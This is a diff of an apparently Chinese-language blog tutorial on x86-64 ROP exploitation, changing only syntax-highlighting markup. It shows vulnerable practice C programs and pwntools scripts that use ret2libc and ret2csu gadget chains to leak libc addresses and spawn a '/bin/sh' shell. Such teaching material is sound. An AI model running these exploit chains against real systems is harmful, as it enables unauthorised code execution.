@@ -125,10 +125,10 @@
 
 <p>  而 <strong><em>%rax</em></strong> 依旧用于保存返回值。知道这些储备知识以后，我们来开一个使用gadgets来控制程序的例子。</p>
 
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;unistd.h&gt;
-#include &lt;dlfcn.h&gt;
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;dlfcn.h&gt;</span><span class="cp">
 </span>
 <span class="kt">void</span> <span class="nf">systemaddr</span><span class="p">()</span>
 <span class="p">{</span>
@@ -207,14 +207,14 @@
 
 <span class="n">vuln_addr</span> <span class="o">=</span> <span class="mh">0x000011db</span>
 
-<span class="n">system_addr_str</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">system_addr_str</span> <span class="o">=</span> <span class="n">sh</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
 <span class="n">system_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">system_addr_str</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span>
 <span class="k">print</span> <span class="s">"system_addr= "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
 
-<span class="n">pop_pop_call_offset</span> <span class="o">=</span> <span class="mh">0x00000000000f982b</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
+<span class="n">pop_pop_call_offset</span> <span class="o">=</span> <span class="mh">0x00000000000f982b</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
 <span class="k">print</span> <span class="s">"pop_offset= "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">pop_pop_call_offset</span><span class="p">)</span>
 
-<span class="n">bin_sh_offset</span> <span class="o">=</span> <span class="mh">0x0000000000181519</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span> <span class="c1"># libc.search('/bin/sh').next()
+<span class="n">bin_sh_offset</span> <span class="o">=</span> <span class="mh">0x0000000000181519</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span> <span class="c1"># libc.search('/bin/sh').next()
 </span><span class="k">print</span> <span class="s">"bin_sh_offset= "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">bin_sh_offset</span><span class="p">)</span>
 
 <span class="n">pop_pop_call_addr</span> <span class="o">=</span> <span class="n">system_addr</span> <span class="o">+</span> <span class="n">pop_pop_call_offset</span>
@@ -228,9 +228,9 @@
 <span class="n">payload</span> <span class="o">=</span> <span class="s">'a'</span><span class="o">*</span><span class="mh">0x88</span> <span class="o">+</span>  <span class="n">p64</span><span class="p">(</span><span class="n">pop_pop_call_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
 <span class="c1">#payload = "a" * 0x80 + 'b' * '8' + p64(pop_ret_addr) + p64(bin_sh) + p64(system_addr)
 </span>
-<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> 
+<span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> 
 
-<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div></div>
 
 <p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/rop_libc.png?raw=true" alt="result" /></p>
@@ -299,15 +299,15 @@
    129c:       c3                      retq   <span class="c">#此处构造一些padding(7*8=56byte)就可以返回了</span>
 </code></pre></div></div>
 
-<p>  首先我们来看一下gadgets1，pop了一堆东西进到寄存器里，然后控制ret到gadget2,此时我们便可以看出其中的玄机，gadget1中pop进寄存器的值竟然被传进了我们梦寐以求的rdi rsi rdx 三个参数寄存器，然后接下来 <code class="highlighter-rouge">callq *(%r12,%rbx,8)</code> 会调用 <strong>[$r12 + rbx*8]</strong> 处的函数,之后进行 rbx += 1,然后比较rbx与rbp的值，如果想等那么就继续向下进行，并且ret到我们想要继续执行的位置。到这，我就可以开始思考如何给gadget1传参数了，反复思索后：</p>
+<p>  首先我们来看一下gadgets1，pop了一堆东西进到寄存器里，然后控制ret到gadget2,此时我们便可以看出其中的玄机，gadget1中pop进寄存器的值竟然被传进了我们梦寐以求的rdi rsi rdx 三个参数寄存器，然后接下来 <code class="language-plaintext highlighter-rouge">callq *(%r12,%rbx,8)</code> 会调用 <strong>[$r12 + rbx*8]</strong> 处的函数,之后进行 rbx += 1,然后比较rbx与rbp的值，如果想等那么就继续向下进行，并且ret到我们想要继续执行的位置。到这，我就可以开始思考如何给gadget1传参数了，反复思索后：</p>
 
 <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$rbx</span> <span class="o">=</span> <span class="mi">0</span>
 
 <span class="nv">$rbp</span> <span class="o">=</span> <span class="mi">1</span>
 
-<span class="nv">$r12</span> <span class="o">=</span> <span class="nx">callee</span> <span class="k">function</span>
+<span class="nv">$r12</span> <span class="o">=</span> <span class="n">callee</span> <span class="k">function</span>
 
-<span class="err">$</span><span class="nf">r13</span> <span class="o">=</span> <span class="nx">arg1</span>			<span class="nv">$r14</span> <span class="o">=</span> <span class="nx">arg2</span>				<span class="nv">$r15</span> <span class="o">=</span> <span class="nx">arg3</span>
+<span class="nv">$r13</span> <span class="o">=</span> <span class="n">arg1</span>			<span class="nv">$r14</span> <span class="o">=</span> <span class="n">arg2</span>				<span class="nv">$r15</span> <span class="o">=</span> <span class="n">arg3</span>
 </code></pre></div></div>
 <blockquote>
   <p>这里需要注意的是需要构造56个padding，因为进行了6次pop和一次ret，使得rsp增大了56bytes。</p>
@@ -317,9 +317,9 @@
 
 <p>  下面我们来看一道题：</p>
 
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;unistd.h&gt;
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
 </span>
 <span class="kt">void</span> <span class="nf">vulnerable_function</span><span class="p">()</span> <span class="p">{</span>
     <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
@@ -371,39 +371,39 @@
 <span class="n">bss</span> <span class="o">=</span> <span class="mh">0x00000008</span>
 <span class="n">read_got</span> <span class="o">=</span> <span class="mh">0x404020</span>
 
-<span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'write'</span><span class="p">]</span>
+<span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'write'</span><span class="p">]</span>
 <span class="k">print</span> <span class="s">"write_got= "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span>
-<span class="n">write_libc</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'write'</span><span class="p">]</span>
+<span class="n">write_libc</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'write'</span><span class="p">]</span>
 <span class="k">print</span> <span class="s">"write_libc= "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">write_libc</span><span class="p">)</span>
-<span class="n">system_libc</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
+<span class="n">system_libc</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
 <span class="k">print</span> <span class="s">"system_libc= "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_libc</span><span class="p">)</span>
-<span class="n">bin_sh_libc</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">'/bin/sh'</span><span class="p">)</span><span class="o">.</span><span class="nb">next</span><span class="p">()</span>
+<span class="n">bin_sh_libc</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="s">'/bin/sh'</span><span class="p">).</span><span class="nb">next</span><span class="p">()</span>
 <span class="k">print</span> <span class="s">"bin_sh_libc= "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">bin_sh_libc</span><span class="p">)</span>
 
 <span class="c1">#get the address of write
 </span><span class="n">payload1</span> <span class="o">=</span> <span class="s">'a'</span><span class="o">*</span><span class="mh">0x88</span>  <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4011e2</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
 <span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4011c8</span><span class="p">)</span> <span class="o">+</span> <span class="s">'d'</span> <span class="o">*</span> <span class="mi">56</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span>
 
-<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Hello, World</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
-<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Hello, World</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
 <span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
 
-<span class="n">write_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
+<span class="n">write_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">sh</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
 <span class="k">print</span> <span class="s">"write_addr= "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">write_addr</span><span class="p">)</span>
 <span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
 
 <span class="c1">#get the address of system and bin_sh
 </span><span class="n">payload2</span> <span class="o">=</span> <span class="s">'a'</span><span class="o">*</span><span class="mh">0x88</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4011e2</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">read_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4011c8</span><span class="p">)</span> <span class="o">+</span> <span class="s">'d'</span><span class="o">*</span><span class="mi">56</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span>
-<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
-<span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">system_libc</span> <span class="o">+</span> <span class="n">write_addr</span> <span class="o">-</span> <span class="n">write_libc</span><span class="p">))</span>
-<span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"/bin/sh</span><span class="se">\0</span><span class="s">"</span><span class="p">)</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">system_libc</span> <span class="o">+</span> <span class="n">write_addr</span> <span class="o">-</span> <span class="n">write_libc</span><span class="p">))</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"/bin/sh</span><span class="se">\0</span><span class="s">"</span><span class="p">)</span>
 <span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
-<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Hello, World</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Hello, World</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
 
 <span class="c1">#activate the system("/bin/sh")
 </span><span class="n">payload3</span> <span class="o">=</span> <span class="s">'a'</span><span class="o">*</span><span class="mh">0x88</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4011e2</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4011c8</span><span class="p">)</span> <span class="o">+</span> <span class="s">'d'</span> <span class="o">*</span><span class="mi">56</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span>
-<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload3</span><span class="p">)</span>
-<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload3</span><span class="p">)</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div></div>
 <p>  至此，一个华丽的利用已经完成了.</p>
 
